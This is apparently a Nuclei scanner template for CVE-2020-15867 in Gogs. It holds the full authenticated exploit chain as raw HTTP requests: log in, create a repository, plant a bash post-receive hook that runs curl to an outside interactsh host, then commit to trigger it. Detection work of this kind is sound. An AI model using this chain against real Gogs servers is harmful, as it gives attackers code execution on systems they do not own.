http:
- extractors:
  - group: 1
    internal: true
    name: csrf
    regex:
    - name="_csrf" value="(.*)"
    type: regex
  - group: 1
    internal: true
    name: auth_csrf
    regex:
    - name="_csrf" content="(.*)"
    type: regex
  - group: 1
    internal: true
    name: last_commit
    regex:
    - name="last_commit" value="(.*)"
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: body_1
    type: word
    words:
    - content="Gogs
  matchers-condition: and
  raw:
  - 'GET /user/login HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /user/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _csrf={{csrf}}&user_name={{username}}&password={{url_encode(password)}}

    '
  - 'GET /repo/create HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /repo/create HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _csrf={{auth_csrf}}&user_id=1&repo_name={{randstr}}&private=on&description=&gitignores=&license=&readme=Default&auto_init=on

    '
  - 'POST /{{username}}/{{randstr}}/settings/hooks/git/post-receive HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _csrf={{auth_csrf}}&content=%23%21%2Fbin%2Fbash%0D%0Acurl+{{interactsh-url}}

    '
  - 'GET /{{username}}/{{randstr}}/_new/master HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /{{username}}/{{randstr}}/_new/master HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _csrf={{auth_csrf}}&last_commit={{last_commit}}&tree_path=test.txt&content=test&commit_summary=&commit_message=&commit_choice=direct

    '
id: CVE-2020-15867
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:gogs:gogs:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-15867
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.2
    epss-percentile: 0.99554
    epss-score: 0.96659
  description: 'Gogs 0.5.5 through 0.12.2 is susceptible to authenticated remote code
    execution via the git hooks functionality. There can be a privilege escalation
    if access to this feature is granted to a user who does not have administrative
    privileges. NOTE: Since this is mentioned in the documentation but not in the
    UI, it could be considered a "product UI does not warn user of unsafe actions"
    issue.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  metadata:
    max-request: 7
    product: gogs
    vendor: gogs
    verified: true
  name: Gogs 0.5.5 - 0.12.2 - Remote Code Execution
  reference:
  - https://packetstormsecurity.com/files/162123/Gogs-Git-Hooks-Remote-Code-Execution.html
  - https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1125-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent/
  - http://packetstormsecurity.com/files/162123/Gogs-Git-Hooks-Remote-Code-Execution.html
  - https://nvd.nist.gov/vuln/detail/CVE-2020-15867
  remediation: 'Upgrade Gogs to a version that is not affected by the vulnerability
    (0.12.3 or later).

    '
  severity: high
  tags: cve,cve2020,rce,gogs,git,authenticated,packetstorm,intrusive
